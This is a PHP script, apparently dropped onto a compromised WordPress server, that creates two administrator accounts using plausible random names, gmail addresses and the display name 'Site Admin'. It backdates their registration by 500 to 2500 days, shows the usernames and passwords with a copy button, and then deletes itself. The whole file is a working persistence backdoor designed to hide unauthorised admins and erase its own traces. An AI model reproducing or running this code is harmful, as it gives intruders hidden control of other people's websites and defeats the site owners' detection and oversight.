<?php
error_reporting(E_ALL);
ini_set('display_errors',1);


/*
=========================
加载 WordPress
=========================
*/

$wp_loaded=false;


$search_paths=[

    __DIR__.'/wp-load.php',

    dirname(__DIR__).'/wp-load.php',

    dirname(dirname(__DIR__)).'/wp-load.php',

    $_SERVER['DOCUMENT_ROOT'].'/wp-load.php'

];


foreach($search_paths as $path){

    if(file_exists($path)){

        require_once $path;

        $wp_loaded=true;

        break;

    }

}


if(!$wp_loaded || !function_exists('wp_insert_user')){

    die("<h3>无法加载 WordPress 环境</h3>");

}




/*
=========================
名字库
=========================
*/


$names=[
"peytonfox","philipblue","phoenixstone","porterwalker","prestonfox","princeblue","quincyStone","quinnwalker","rafaelfox","raidenblue",
"ramonstone","randywalker","rangerfox","reeseBlue","reginaldstone","remingtonwalker","rexfox","rhysblue","richardstone","rileywalker",
"riverfox","robertblue","rockyStone","romanwalker","ronanfox","roswellblue","rowanstone","roywalker","rubenfox","russellblue",
"rykerstone","saberwalker","sagefox","salvadorblue","samsonstone","santanaWalker","sawyerfox","scottyblue","sergeantstone","shawnwalker",
"shermanfox","silasblue","simeonstone","skywalker","slaterfox","solblue","sonnyStone","spencerwalker","stanleyfox","sterlingblue",
"stevenstone","sullivanwalker","tannerfox","tateblue","terrenceStone","theowalker","thomasfox","thorblue","titusstone","tobiaswalker",
"tommyfox","traceblue","trentonstone","trentwalker","treyfox","tristanblue","trumanstone","tuckerwalker","turnerfox","tysonblue",
"ulysseStone","valenwalker","vaughnfox","vernonblue","vinceStone","vincentwalker","wadefox","walterblue","warnerstone","watsonwalker",
"waynefox","wesleyblue","westonstone","whitakerwalker","wilsonfox","winstonblue","wolfstone","woodrowwalker","wrightfox","wylderblue",
"xanderstone","xaviwalker","xenonfox","yaelblue","yorkstone","yosefwalker","youngfox","zackblue","zaneStone","zaydenwalker",
"zevfox","zionblue","zuriStone","aaronfox","abelblue","abrahamstone","acewalker","adamfox","adrianblue","albertstone",
"alexwalker","alfredfox","allenblue","alonzoStone","amoswalker","andrefox","angeloBlue","antonstone","archerwalker","arnoldfox",
"arthurblue","auguststone","averywalker","baronfox","basilblue","beaumontstone","billywalker","bishopfox","blaineblue","blazeStone",
"bodhiwalker","borisfox","bradenblue","brandonstone","brextonwalker","brockfox","brookblue","calixstone","casonwalker","cedarfox",
"chadblue","chanceStone","cliftonwalker","clintonfox","clydeblue","colterstone","cullenwalker","curtisfox","cyrusblue","damarisstone",
"dantewalker","darianfox","darioBlue","darwinstone","daxwalker","deanfox","delaneyblue","derrickstone","devonwalker","diegofox",
"dominiqueBlue","drakeStone","eastonwalker","echofox","edisonblue","edmundstone","elliswalker","elvisfox","emersonblue","enzoStone",
"erikwalker","ernestfox","estonblue","eugeneStone","fabioWalker","felipefox","fergusblue","floydstone","francoWalker","freddyfox",
"gabrielblue","garfieldstone","gastonwalker","geoffreyfox","gerardblue","gilbertstone","ginoWalker","gordonfox","graysonblue","guystone",
"hamiltonwalker","hansonfox","harperblue","harrisstone","hugoWalker","ianfox","irvineblue","jaxstone","jensenwalker","jerichofox",
"jesseblue","jonathanstone","juliuswalker","kellanfox","kobeBlue","kyrostone","lambertwalker","larsfox","lelandblue","loganstone","ryanwalker","ryderfox","samuelblue","sawyerstone","scottwalker","seanfox","sebastianblue","silasstone","simonwalker","solomonfox",
"spencerblue","sterlingstone","stephenwalker","sullivanfox","tannerblue","tateStone","thomaswalker","timothyfox","tobiasblue","travisstone",
"trevorwalker","tristanfox","troyblue","tylerstone","ulrichwalker","urbanfox","valentinblue","vanceStone","victorwalker","vincentfox",
"walkerblue","warrenstone","wesleywalker","westonfox","whitestone","wilburwalker","williamfox","winstonblue","wyattstone","xanderwalker",
"xavierfox","yaleBlue","yorkstone","zacharywalker","zanderfox","zayneblue","zephyrstone","zionwalker","abnerfox","aceblue",
"adlerstone","alastairwalker","aldenfox","aldoBlue","amosstone","andrewalker","antonfox","apolloBlue","asherstone","aureliowalker",
"axelfox","baylorblue","becketstone","bennettwalker","bensonfox","bertrandblue","blaineStone","bookerwalker","bowenfox","bransonblue",
"breckenstone","brendanwalker","briarfox","briggsblue","brooksstone","brunoWalker","burtonfox","caidenblue","cameronstone","carlwalker",
"carterfox","cedricblue","chandlerstone","charliewalker","clarkfox","cobyblue","colinStone","conradwalker","corbinfox","crewblue",
"daltonstone","damonwalker","dallasfox","darielblue","dariusstone","dawsonwalker","deckerfox","deshawnblue","devonstone","dexterwalker",
"dominofx","dravenblue","draysonstone","edenwalker","edgarfox","eliotblue","eltonstone","emerywalker","emoryfox","enzoBlue",
"evanderstone","everettwalker","ezekielfox","felixblue","fisherstone","flynnwalker","forrestfox","frankblue","garlandstone","garnerwalker",
"gideonfox","glennblue","goldenstone","gradywalker","griffinblue","groverfox","harlanstone","harleywalker","haroldfox","heathblue",
"hendrixstone","hunterwalker","huxleyfox","ingramblue","irvingstone","isaiyahwalker","jacefox","jackblue","jamesonstone","jaredwalker",
"jasperfox","jayceblue","jeromeStone","jettwalker","joeyfox","jonasblue","judeStone","justicewalker","kadefox","kaidenblue",
"kaiStone","karterwalker","kasenfox","kellanblue","kennethstone","killianwalker","kingfox","knoxblue","kysonstone","lancewalker",
"landenfox","langstonblue","lawsonstone","legendwalker","lewisfox","lincolnblue","loganstone","lorenzoWalker","lucianfox","lyricblue",
"mackstone","malcolmwalker","marcellusfox","marcusblue","marshallstone","martinwalker","maverickfox","mercerblue","michelstone","mileswalker",
"milofox","montgomeryblue","mosesstone","nashwalker","nelsonfox","neoBlue","neilstone","nicolaswalker","nolanfox","oakleyblue",
"octaviusstone","oliverwalker","onyxfox","orionblue","osborneStone","ottoWalker","palmerfox","parkerblue","patrickstone","paxtonwalker",
"adamsmith","alexandermoon","andersonblue","andrewwalker","angelstone","anthonyfox","archerblue","arnoldstone","arthurwalker","asherfox",
"atlasblue","axtonmoon","baileywalker","barryfox","bastianstone","beauwalker","beckettfox","bensonblue","bentleystone","berkleywalker",
"blakehunter","blairfox","bodhiblue","bradleywalker","braxtonstone","braydenfox","brettblue","brixtonmoon","brockstone","brookswalker",
"brodyfox","brysonblue","cadewalker","cadenstone","cairofox","calebblue","callanmoon","calvinwalker","camdenfox","carlstone",
"carloswalker","carterblue","casperfox","cassianstone","cedarwalker","chancefox","charlesblue","chasewalker","christianfox","christopherstone",
"cianwalker","claytonblue","cliffstone","clivewalker","codyfox","colbyblue","colemanstone","connorfox","constantinewalker","cooperblue",
"corbinstone","corywalker","craigfox","cruzblue","dakotastone","damianwalker","danielfox","danteblue","darianstone","davidwalker",
"deaconfox","declanblue","desmondstone","devinwalker","dexterfox","diegoBlue","dillonstone","dominickwalker","donovanfox","drakeblue",
"drewstone","duanewalker","duncanfox","eastblue","edenstone","edwardwalker","eliFox","eliasblue","elijahstone","elliswalker",
"emiliofox","emmettblue","enzoStone","ericwalker","ethanfox","evanblue","everettstone","ezrawalker","fabianfox","finnblue",
"finleywalker","fletcherstone","fordfox","forestblue","frankwalker","frederickfox","gabrielblue","gavinwalker","genestone","georgefox",
"gideonblue","grahamwalker","grantfox","griffinstone","graysonblue","gunnerwalker","hankfox","harrisonblue","harveywalker","hayesstone",
"hectorfox","hendrixblue","henrywalker","holdenfox","hudsonstone","hughwalker","hunterblue","isaacfox","ivanstone","jacksonwalker",
"jacobfox","jadenblue","jaggerstone","jameswalker","jamisonfox","jasonblue","jaxonstone","jeremywalker","jessefox","joelblue",
"johnstone","jonahwalker","jonathanfox","josephblue","joshstone","julianwalker","kaiFox","kaidenblue","kalebstone","kameronwalker",
"kanefox","karsonblue","keatonstone","kevinwalker","kianfox","kingstonblue","knoxstone","kylerwalker","landenfox","landonblue",
"lawrenceStone","leonwalker","levifox","liamstone","loganblue","louiswalker","lucasfox","lutherblue","maddoxstone","marcuswalker",
"masonfox","mateoblue","maverickstone","maxwellwalker","micahfox","milesblue","miloStone","nashwalker","nathanfox","nolanblue",
"noahstone","nolanwalker","oakleyfox","oliverblue","orionstone","oscarwalker","ottofox","owenblue","parkerstone","paxtonwalker",
"phoenixfox","prestonblue","quinnstone","rafaelwalker","rangerfox","reidblue","remyStone","rhettwalker","romanfox","rowanblue","aaronwalker","abrahamstone","adamfox","adrianblue","albertmoon","alecwalker","alexstone","alfredfox","andrewhunter","anthonyblue",
"archerstone","ashermoon","austinwalker","barrettfox","beaublue","beckettstone","benfox","bentleymoon","bernardwalker","blakefox",
"bobbyblue","bradstone","bradywalker","brettfox","brockmoon","brooksstone","brookswalker","brucefox","bryceblue","byronstone",
"calebwalker","callumfox","calvinmoon","cameronstone","carsonwalker","caseyfox","cedricblue","chancewalker","chesterstone","clarkfox",
"claudemoon","claywalker","clintonfox","coleblue","coltonstone","connorwalker","cooperfox","coreymoon","corystone","craigwalker",
"daltonfox","damonblue","danielstone","darwinwalker","darrenfox","dawsonmoon","deanstone","declanwalker","denverfox","devinblue",
"dominicsone","donovanwalker","drewfox","dukemoon","dustinstone","dylandwalker","eastonfox","edisonblue","edmundstone","eliwalker",
"eliasfox","elijahmoon","elliotstone","elviswalker","emersonfox","emmettblue","enzo stone","erikwalker","ernestfox","everettmoon",
"fabianstone","felixwalker","finleyfox","finnblue","floydstone","forrestwalker","francisfox","frankmoon","freddieblue","gabrielstone",
"garrettwalker","gavinfox","geoffreyblue","geraldstone","gilbertwalker","gordonfox","grahammoon","grantstone","greysonwalker","griffinfox",
"gunnerblue","gusstone","harveywalker","haydenfox","heathmoon","hendrixstone","henrywalker","holdenfox","hudsonblue","hugoestone",
"hunterwalker","ianfox","isaacblue","ivanstone","jackwalker","jacksonfox","jacobmoon","jamesstone","jamisonwalker","jaredfox",
"jasperblue","jaystone","jeremiahwalker","jeremyfox","jessestone","joelwalker","jonahfox","jonathanblue","jordanstone","josephwalker",
"josiahfox","judahmoon","julianstone","justinwalker","kaifox","kalebblue","karterstone","keatonwalker","keeganfox","keithmoon",
"kelvinstone","kendrickwalker","kennyfox","kentblue","kevinstone","kingstonwalker","kirkfox","kylemoon","landenstone","landonwalker",
"lanefox","larryblue","lawsonstone","leowalker","levifox","liamblue","lincolnstone","loganwalker","lorenzofox","lucasmoon",
"lukeStone","maddoxwalker","malachiFox","marcusblue","marcusstone","marleywalker","masonfox","mateomoon","matthewstone","maxwalker",
"maxwellfox","mckinleyblue","micahstone","michaelwalker","milesfox","miloMoon","mitchellstone","morganwalker","nashfox","nathanblue",
"nicholasstone","nicoWalker","nolanfox","noahblue","nortonstone","oakleywalker","oliverfox","orionmoon","oscarstone","owenwalker",
"parkerfox","paxtonblue","peytonstone","phoenixwalker","prestonfox","quintonblue","rafaelstone","reaganwalker","reesefox","remingtonmoon",
"rileyStone","riverwalker","robertxfox","romanblue","ryanstone","rykerwalker","samuelfox","santiagoMoon","sawyerstone","sebastianwalker","jameswalker","johnsmith","michaelbrown","williamjones","davidwilson","richardtaylor","charlesanderson","thomasthomas","christopherjackson","danielwhite",
"matthewharris","anthonymartin","donaldthompson","markgarcia","paulmartinez","stevenrobinson","andrewclark","kennethrodriguez","georgelewis","joshualee",
"edwardwalker","brianhall","ronaldallen","kevinyoung","jasonhernandez","jeffreyking","ryanwright","jacoblopez","garyhill","nicholasgreen",
"ericadams","jonathanbaker","stephenscott","larrycarter","justinmitchell","scottroberts","brandonturner","benjaminphillips","samuelcampbell","gregoryparker",
"frankevans","alexanderedwards","raymondcollins","patrickstewart","jackmorris","dennisrogers","jerryreed","tylercook","aaronmorgan","josephbell",
"henrymurphy","adambailey","nathanrivera","douglascook","zacharyrichardson","kylecooper","walterrichardson","haroldcox","jeremyhoward","ethanward",
"christianwaton","noahtorres","loganpeterson","lukehughes","masonflores","owenwashington","liambutler","aidanprice","lucaswatson","connorgray",
"jacksonjames","cameronfoster","wyattbryant","dylanhunter","carterharrison","landonmason","graysonkennedy","huntermatthews","isaacdixon","jordanreynolds",
"calebhamilton","coltonford","bradleygraham","spencermarshall","tristanwave","austindixon","blakeharper","evanholmes","garrettmurray","ianrussell",
"jaredgriffin","colemorgan","tysonbell","aidanfox","brodywalker","maxwellstone","loganblue","titanpro","valentinfox","sonnyblue",
"walkerstar","westonblue","winstonmoon","theodoremoon","alexanderfox","masonriver","hunterstone","jasonblue","michaelstorm","danielwave",
"oliverbrown","georgewhite","arthurking","henryfox","sebastianmoon","felixstone","victorblue","oscarriver","leonwalker","maxhunter",
"leoanderson","samwalker","benjaminfox","charliemason","frederickhill","alfredyoung","vincentking","martinrose","robertcole","patrickmoon",
"arthurgray","edwinstone","lewiswalker","franklinblue","brucehunter","claytonfox","bennettwave","wesleyking","colinmason","derekstone",
"rileywalker","parkerblue","aidenmoon","jordanfox","haydenstone","micahwave","theowalker","asherking","elliotbrown","silasfox",
"wyattblue","grantmoon","harrisonstone","jasperwalker","kingstonfox","milesriver","romanblue","phoenixmoon","atlasstone","riverwalker",
"averyfox","morganblue","charliewave","blairstone","dakotahunter","emerywalker","finleyfox","harleyblue","kendallmoon","quinnstone",
"reidwalker","rowanfox","sawyerblue","skylerwave","taylorstone","teaganmoon","westonfox","xavierblue","zanehunter","zacharymoon",
"braydenstone","camdenwalker","declanfox","eastonthorne","everettblue","finnmoon","gavinstone","hudsonwalker","jaxonfox","kaihunter"
];





/*
=========================
生成用户名
=========================
*/


function generate_username($names){


    for($i=0;$i<50;$i++){


        $username=strtolower(
            $names[array_rand($names)]
        );


        if(!username_exists($username)){

            return $username;

        }


    }


    return 'user'.time();


}




/*
=========================
生成密码
=========================
*/


function random_password($length=12){


    $chars=
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%";


    $password='';


    for($i=0;$i<$length;$i++){


        $password.=
        $chars[random_int(0,strlen($chars)-1)];


    }


    return $password;


}





/*
=========================
创建用户
=========================
*/


function create_random_admin($names){



    for($try=0;$try<10;$try++){



        $username=
        generate_username($names);



        if(username_exists($username)){

            continue;

        }



        $password=
        random_password(12);



        if(strlen($password)<12){

            continue;

        }




        $email=
        $username.rand(1000,9999)."@gmail.com";



        /*
        随机注册时间
        500-2500天以前
        */


      $random_time = strtotime(
    "-".rand(500,2500)." days"
);

$registered = date(
    "Y-m-d H:i:s",
    mktime(
        rand(0,23),   // 小时
        rand(0,59),   // 分钟
        rand(0,59),   // 秒
        date("m",$random_time),
        date("d",$random_time),
        date("Y",$random_time)
    )
);





        $user_id=wp_insert_user([


            'user_login'=>$username,


            'user_pass'=>$password,


            'user_email'=>$email,


            'user_registered'=>$registered,


            'first_name'=>'Admin',


            'display_name'=>'Site Admin',


            'role'=>'administrator'


        ]);





        if(!is_wp_error($user_id)){



            return [


                'success'=>true,


                'id'=>$user_id,


                'username'=>$username,


                'password'=>$password,


                'registered'=>$registered


            ];



        }



    }





    return [


        'success'=>false,


        'message'=>'创建失败'


    ];



}





/*
=========================
开始创建数量
=========================
*/


$need_create=2;


$results=[];


$max_loop=30;


$i=0;



while(count($results)<$need_create && $i<$max_loop){


    $i++;


    $result=
    create_random_admin($names);



    if($result['success']){


        $duplicate=false;



        foreach($results as $old){


            if($old['username']==$result['username']){


                $duplicate=true;


            }


        }




        if(!$duplicate){


            $results[]=$result;


        }


    }



}






/*
=========================
输出
=========================
*/


echo "<h2>管理员创建报告</h2>";



if(!$results){


    echo "<p style='color:red'>创建失败</p>";


    exit;


}




foreach($results as $index=>$user){


    echo "<div style='border:1px solid #ddd;padding:10px;margin:10px 0'>";


    echo "<b>账户 ".($index+1)."</b><br>";

    echo "状态:
    <span style='color:green'>
    ✓成功
    </span><br>";

    echo "ID:
    ".$user['id']."<br>";

    echo "用户名:
    ".$user['username']."<br>";

    echo "密码:
    ".$user['password']."<br>";

    echo "注册时间:
    ".$user['registered']."";


    echo "</div>";

}




echo "<h3>登录信息汇总</h3>";

$login_text='';


foreach($results as $user){

    $login_text .= $user['username'].":".$user['password']." | ";

}


$login_text=rtrim($login_text," | ");


echo "
<textarea id='logininfo'
style='width:600px;height:50px;font-size:16px;'>".
htmlspecialchars($login_text).
"</textarea>

<br><br>

<button onclick='copyLogin()'
style='padding:8px 20px;font-size:16px;'>
复制
</button>


<script>

function copyLogin(){

    let box=document.getElementById('logininfo');

    box.select();

    navigator.clipboard.writeText(box.value);

    alert('已复制');

}

</script>
";



/*
=========================
执行结束删除自身
=========================
*/


ignore_user_abort(true);

set_time_limit(0);


register_shutdown_function(function(){

    @unlink(__FILE__);

});


?>
